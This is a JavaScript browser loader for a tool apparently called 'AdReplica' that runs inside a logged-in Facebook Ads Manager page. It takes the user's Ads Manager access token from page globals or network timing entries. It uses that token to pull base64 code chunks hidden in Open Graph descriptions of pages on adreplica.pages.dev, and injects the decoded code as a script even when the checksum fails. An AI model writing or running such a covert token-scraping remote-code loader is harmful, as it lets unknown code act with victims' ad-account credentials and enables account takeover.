(function adReplicaLoader(config) {
  "use strict";

  const loaderConfig = Object.assign({
    app: "AdReplica",
    manifestUrl: "https://adreplica.pages.dev/adreplica/latest/manifest.html",
    cacheKey: "adreplica.loader.cache.v1",
    timeoutMs: 45000,
  }, config || {});
  const guardKey = "__AdReplicaLoader";
  const host = String(location.hostname || "");

  if (!/(^|\.)facebook\.com$/.test(host)) {
    location.href = "https://adsmanager.facebook.com/";
    return;
  }
  if (window[guardKey]?.loading) {
    console.warn(`[${loaderConfig.app}] Loader is already running.`);
    return;
  }
  window[guardKey] = { loading: true, build: "latest", startedAt: Date.now(), source: "" };

  const log = (message) => console.log(`[${loaderConfig.app} loader] ${message}`);
  const fail = (error) => {
    console.error(`[${loaderConfig.app} loader] Failed.`, error);
    alert(`${loaderConfig.app} loader failed: ${error?.message || error}`);
  };
  const withTimeout = (promise, label) => Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(`${label} timed out`)), loaderConfig.timeoutMs)),
  ]);
  const decodeBase64Utf8 = (base64) => {
    const binary = atob(String(base64 || "").replace(/\s+/g, ""));
    const bytes = new Uint8Array(binary.length);
    for (let index = 0; index < binary.length; index += 1) {
      bytes[index] = binary.charCodeAt(index);
    }
    return new TextDecoder().decode(bytes);
  };
  const compareBuildVersions = (left, right) => {
    const pattern = /^(\d{2})(\d{2})(\d{2})b(\d+)$/i;
    const leftMatch = String(left || "").match(pattern);
    const rightMatch = String(right || "").match(pattern);
    if (!leftMatch || !rightMatch) {
      return String(left || "").localeCompare(String(right || ""));
    }
    const leftParts = [
      Number(leftMatch[3]),
      Number(leftMatch[2]),
      Number(leftMatch[1]),
      Number(leftMatch[4]),
    ];
    const rightParts = [
      Number(rightMatch[3]),
      Number(rightMatch[2]),
      Number(rightMatch[1]),
      Number(rightMatch[4]),
    ];
    for (let index = 0; index < leftParts.length; index += 1) {
      if (leftParts[index] !== rightParts[index]) {
        return leftParts[index] - rightParts[index];
      }
    }
    return 0;
  };
  const fetchJson = async (url, init = {}) => {
    const response = await withTimeout(fetch(url, Object.assign({
      credentials: "include",
      cache: "no-store",
    }, init)), url);
    const text = await response.text();
    if (!response.ok) {
      throw new Error(`${response.status} ${text.slice(0, 200)}`);
    }
    const clean = text.replace(/^for\s*\(;;\);\s*/, "");
    return JSON.parse(clean);
  };
  const getAdsManagerAccessToken = () => {
    if (window.__accessToken) {
      return window.__accessToken;
    }
    const entries = performance.getEntriesByType("resource")
      .map((entry) => entry.name || "")
      .filter((url) => url.includes("adsmanager-graph.facebook.com") && url.includes("access_token="));
    for (const entry of entries) {
      try {
        const token = new URL(entry).searchParams.get("access_token");
        if (token) {
          return token;
        }
      } catch (error) {
        // Ignore malformed performance entries.
      }
    }
    return "";
  };
  const sha256Hex = async (text) => {
    if (!crypto?.subtle) {
      throw new Error("crypto.subtle is not available for payload verification.");
    }
    const buffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
    return Array.from(new Uint8Array(buffer))
      .map((byte) => byte.toString(16).padStart(2, "0"))
      .join("");
  };
  const readCache = () => {
    try {
      const raw = localStorage.getItem(loaderConfig.cacheKey);
      if (!raw) {
        return null;
      }
      const cached = JSON.parse(raw);
      if (!cached?.source || !cached?.version) {
        return null;
      }
      return cached;
    } catch (error) {
      console.warn(`[${loaderConfig.app} loader] Ignoring unreadable cache.`, error);
      return null;
    }
  };
  const writeCache = (manifest, source, actualSha256 = "") => {
    try {
      localStorage.setItem(loaderConfig.cacheKey, JSON.stringify({
        app: loaderConfig.app,
        version: manifest.version,
        sha256: actualSha256 || manifest?.payload?.sha256 || "",
        manifestSha256: manifest?.payload?.sha256 || "",
        byteLength: manifest.payload.byteLength,
        source,
        savedAt: new Date().toISOString(),
      }));
    } catch (error) {
      console.warn(`[${loaderConfig.app} loader] Payload loaded, but cache write failed.`, error);
    }
  };
  const useCachedPayload = (cached, reason, sourceTag) => {
    if (!cached) {
      return null;
    }
    const warning = `Cannot load latest payload from Facebook OG: ${reason}. Using cached ${cached.version}.`;
    console.warn(`[${loaderConfig.app} loader] ${warning}`);
    window[guardKey].warning = warning;
    window[guardKey].source = sourceTag;
    return { source: cached.source, build: cached.version };
  };
  const getGraphUrls = (accessToken) => {
    const encoded = encodeURIComponent(accessToken);
    return {
      objectById: (id) => `https://adsmanager-graph.facebook.com/v23.0/${encodeURIComponent(id)}?fields=title,description,updated_time&access_token=${encoded}`,
      scrapeByUrl: (url) => `https://graph.facebook.com/?id=${encodeURIComponent(url)}&scrape=true&access_token=${encoded}`,
      ogByUrl: (url) => `https://graph.facebook.com/?id=${encodeURIComponent(url)}&fields=og_object&access_token=${encoded}`,
    };
  };
  const fetchOgObject = async (id) => {
    if (!id) {
      throw new Error("No OG object ID configured.");
    }
    const accessToken = getAdsManagerAccessToken();
    if (!accessToken) {
      throw new Error("Cannot find Ads Manager access_token in current page runtime.");
    }
    const graphUrls = getGraphUrls(accessToken);
    return fetchJson(graphUrls.objectById(id));
  };
  const resolveOgObjectIdByUrl = async (url) => {
    if (!url) {
      throw new Error("No manifest URL configured.");
    }
    const accessToken = getAdsManagerAccessToken();
    if (!accessToken) {
      throw new Error("Cannot find Ads Manager access_token in current page runtime.");
    }
    const graphUrls = getGraphUrls(accessToken);
    const resolved = await fetchJson(graphUrls.ogByUrl(url));
    const ogObjectId = resolved?.og_object?.id;
    if (!ogObjectId) {
      throw new Error(`Could not resolve current OG object for ${url}`);
    }
    return ogObjectId;
  };
  const fetchManifest = async () => {
    const manifestOgObjectId = await resolveOgObjectIdByUrl(loaderConfig.manifestUrl);
    const object = await fetchOgObject(manifestOgObjectId);
    const manifest = JSON.parse(decodeBase64Utf8(object?.description || ""));
    if (manifest?.app !== loaderConfig.app || !manifest?.version) {
      throw new Error("Manifest is malformed or belongs to another app.");
    }
    if (!Array.isArray(manifest.chunks) || !manifest.chunks.length) {
      throw new Error("Manifest does not contain payload chunks.");
    }
    manifest._resolvedManifestOgObjectId = manifestOgObjectId;
    manifest._resolvedUpdatedTime = object?.updated_time || "";
    return manifest;
  };
  const resolveChunkOgObjectId = async (chunk) => {
    const chunkUrl = chunk?.latestUrl || chunk?.url || "";
    if (chunkUrl) {
      return resolveOgObjectIdByUrl(chunkUrl);
    }
    if (chunk?.ogObjectId) {
      return chunk.ogObjectId;
    }
    throw new Error(`Chunk ${chunk?.index || "?"} has neither URL nor OG object ID.`);
  };
  const fetchOgPayload = async (manifest) => {
    const ids = await Promise.all(manifest.chunks.map((chunk) => resolveChunkOgObjectId(chunk)));
    const chunks = await Promise.all(ids.map((id) => fetchOgObject(id)));
    const encoded = chunks.map((chunk) => chunk?.description || "").join("");
    if (!encoded) {
      throw new Error("OG chunks did not contain description payloads.");
    }
    const source = decodeBase64Utf8(encoded);
    const actualSha256 = await sha256Hex(source);
    return {
      source,
      actualSha256,
      manifestSha256: manifest?.payload?.sha256 || "",
    };
  };
  const loadPayload = async () => {
    const cached = readCache();
    let manifest = null;
    try {
      manifest = await fetchManifest();
    } catch (error) {
      const fallback = useCachedPayload(cached, `manifest unavailable (${error?.message || error})`, "cache-no-manifest");
      if (fallback) {
        return fallback;
      }
      throw error;
    }
    if (window[guardKey]) {
      window[guardKey].remoteVersion = manifest.version;
      window[guardKey].manifestUpdatedTime = manifest._resolvedUpdatedTime || "";
    }
    if (cached && compareBuildVersions(cached.version, manifest.version) > 0) {
      return useCachedPayload(cached, `Facebook OG manifest ${manifest.version} is older than cached ${cached.version}`, "cache-remote-stale");
    }
    if (cached && cached.version === manifest.version) {
      log(`using cached ${cached.version}`);
      window[guardKey].source = "cache";
      return { source: cached.source, build: cached.version };
    }
    try {
      const payload = await fetchOgPayload(manifest);
      if (payload.manifestSha256 && payload.actualSha256 !== payload.manifestSha256) {
        console.warn(
          `[${loaderConfig.app} loader] Remote payload checksum mismatch for ${manifest.version}: ${payload.actualSha256} !== ${payload.manifestSha256}. Continuing because version ${manifest.version} is authoritative.`
        );
        if (window[guardKey]) {
          window[guardKey].warning = `Remote payload checksum mismatch for ${manifest.version}. Continuing with version-based loader policy.`;
        }
      }
      writeCache(manifest, payload.source, payload.actualSha256);
      log(`downloaded and cached ${manifest.version}`);
      window[guardKey].source = "remote";
      return { source: payload.source, build: manifest.version };
    } catch (error) {
      const fallback = useCachedPayload(cached, `payload fetch failed (${error?.message || error})`, "cache-remote-failed");
      if (fallback) {
        return fallback;
      }
      throw error;
    }
  };
  const executePayload = (source, build) => new Promise((resolve, reject) => {
    const blob = new Blob([
      source,
      `\n//# sourceURL=adreplica://${build}/payload.js`,
    ], { type: "application/javascript" });
    const blobUrl = URL.createObjectURL(blob);
    const script = document.createElement("script");
    script.src = blobUrl;
    script.onload = () => {
      setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
      script.remove();
      resolve();
    };
    script.onerror = () => {
      URL.revokeObjectURL(blobUrl);
      script.remove();
      reject(new Error("Blob script injection failed."));
    };
    (document.head || document.documentElement).appendChild(script);
  });

  (async () => {
    try {
      const payload = await loadPayload();
      await executePayload(payload.source, payload.build);
      window[guardKey].build = payload.build;
      log(`loaded ${payload.build} payload from ${window[guardKey].source}`);
    } catch (error) {
      fail(error);
    } finally {
      if (window[guardKey]) {
        window[guardKey].loading = false;
        window[guardKey].finishedAt = Date.now();
      }
    }
  })();
})();
